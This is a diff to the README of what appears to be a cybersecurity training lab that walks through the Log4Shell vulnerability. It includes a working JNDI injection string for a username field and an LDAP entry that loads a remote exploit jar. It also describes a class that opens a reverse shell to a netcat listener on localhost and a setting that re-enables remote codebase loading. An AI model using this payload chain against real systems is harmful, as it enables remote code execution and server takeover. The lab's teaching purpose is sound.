@@ -27,7 +27,7 @@ Optionally, if you want to debug the in-memory LDAP server, you can enable `unbo
 
 ### Triggering the vulnerability
 
-To trigger the vulnerability and force Log4j to load a Java Naming Reference LDAP entry (rfc2713) using JNDI, inject the following code into the *username* field of the `user-admin` page (other fields may work too!)
+To trigger the vulnerability and force Log4j to load a Java Naming Reference LDAP entry (rfc2713) using JNDI, inject the following expression into the *username* field of the `user-admin` page (other fields may work too!)
 
 
 ```
@@ -37,7 +37,7 @@ ${jndi:ldap://127.0.0.1:8081/uid=java-ref,ou=people,dc=jisc,dc=ac,dc=uk}
 ![JNDI log4shell injection](site/img/jndi-injection.jpg)
 
 
-The in-memory server has the following `javaNamingReference` object which will be looked up by the JNDI service invoked by the log4j substitution code path:
+The log4j variable substitution code path will then fetch the following `javaNamingReference` object from the in-memory LDAP server (via JNDI):
 
 ```
 dn: uid=java-ref,ou=people,dc=jisc,dc=ac,dc=uk
@@ -53,7 +53,7 @@ sn: Class
 uid: java-ref
 ```
 
-The URLClassLoader will lookup the `uk.ac.jisc.cybersec.rce.RceExploit` first from the local classpath (where it does not exist), then from the URL codebase provided by the LDAP entry. This triggers the download of the referenced `jar` file, and the instatiation of the `uk.ac.jisc.cybersec.rce.RceExploit` class. Triggering the static method in the malicious class:
+The URLClassLoader will lookup the `uk.ac.jisc.cybersec.rce.RceExploit` class firstly from the local classpath — where it does not exist — then from the URL codebase provided by the LDAP entry (e.g. remotely via HTTP at `http://localhost:8080/rce/rce-exploit-0.0.1-SNAPSHOT.jar`). This downloads the referenced `jar` file, and instantiates `uk.ac.jisc.cybersec.rce.RceExploit`. Triggering the static method in the malicious class shown below, which attempts to establish a reverse shell to anything listening on port *8083* on *localhost*:
 
 ```java
 package uk.ac.jisc.cybersec.rce;
@@ -88,4 +88,13 @@ To establish a remote network connection to the compromised web-server, you (as 
 nc -l 8083
 ```
 
-Currently, this is limited to listening on *localhost* or the IP *127.0.0.1* and port *8083* (see how the `RceReverseShellExploit` class is establishing a remote shell). 
+#### Note on Java Version
+
+To ensure the vulnerability works in versions of Java greater than v8, the following property is set automatically by the web-application — JDK versions after JDK 8 disable class creation from URL codebases by default.
+
+
+```
+-Dcom.sun.jndi.ldap.object.trustURLCodebase=true
+```
+
+Note, a 'codebase' can be defined as a source, or a place, from which to load classes into a virtual machine. 
